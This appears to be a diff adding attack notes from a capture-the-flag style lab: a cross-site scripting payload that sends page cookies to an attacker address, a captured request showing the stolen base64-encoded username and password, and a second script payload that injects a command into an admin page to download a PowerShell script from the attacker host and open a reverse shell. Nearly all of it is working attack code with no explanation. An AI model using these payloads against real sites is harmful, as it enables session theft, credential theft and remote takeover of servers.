@@ -1,0 +1,20 @@
+The payload:
+
+<script>
+document.write('<img src="http://10.10.14.47/cookie.gif ' + document.cookie + '" />')
+</script>
+
+---------------------------------------------------------
+
+GET /cookie.gif%20username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1
+Referer: http://localhost/admin/index.php
+User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
+Accept: */*
+Connection: Keep-Alive
+Accept-Encoding: gzip, deflate
+Accept-Language: nl-NL,en,*
+Host: 10.10.14.47
+
+
+XSS payload for reverse shell:
+<script type="text/javascript">var Http = new XMLHttpRequest();var url='/admin/backdoorchecker.php'; var params='cmd=dir| powershell -c "iex (New-Object Net.WebClient).DownloadString(\'http://10.10.14.47:8001/Invoke-PowerShellTcp.ps1\');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.47 -Port 4444"';Http.open("POST", url,true);Http.setRequestHeader('Content-Type','application/x-www-form-urlencoded');Http.send(params);</script>
